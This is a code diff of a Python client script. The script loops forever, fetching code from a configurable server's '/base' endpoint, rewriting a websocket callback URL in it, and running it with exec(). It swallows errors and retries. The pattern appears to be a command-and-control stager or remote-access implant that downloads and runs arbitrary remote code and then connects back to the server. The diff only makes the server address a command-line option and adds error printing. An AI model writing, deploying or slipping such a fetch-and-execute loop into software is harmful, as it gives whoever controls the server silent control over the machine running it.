@@ -14,20 +14,27 @@ import json
 import ctypes
 import lzma
 import gzip
-# 客户端导包
 import urllib.request
 import urllib.parse
+import argparse
 import time
+import traceback
 
-SERVER_ADDRESS = "#SERVER_ADDRESS"
+SERVER_ADDRESS = "http://127.0.0.1:5000"
 
-while True:
-    try:
-        url = "{}/base".format(SERVER_ADDRESS)
-        parsed = urllib.parse.urlparse(url)
-        WS_URL = "{}://{}/ping".format(["wss", "ws"][parsed.scheme == "http"], parsed.netloc)
-        req = urllib.request.urlopen(parsed.geturl())
-        code = req.read().decode().replace("ws://127.0.0.1:5000/ping", WS_URL)
-        exec(code)
-    except BaseException as e:
-        time.sleep(10)
+
+if __name__ == '__main__':
+    parsers = argparse.ArgumentParser()
+    parsers.add_argument("-u", "--url", help="remote server url", default=SERVER_ADDRESS)
+    args = parsers.parse_args()
+    while True:
+        try:
+            url = "{}/base".format(args.url)
+            parsed = urllib.parse.urlparse(url)
+            WS_URL = "{}://{}/ping".format(["wss", "ws"][parsed.scheme == "http"], parsed.netloc)
+            req = urllib.request.urlopen(parsed.geturl())
+            code = req.read().decode().replace("ws://127.0.0.1:5000/ping", WS_URL)
+            exec(code)
+        except BaseException as e:
+            traceback.print_exc()
+            time.sleep(5)
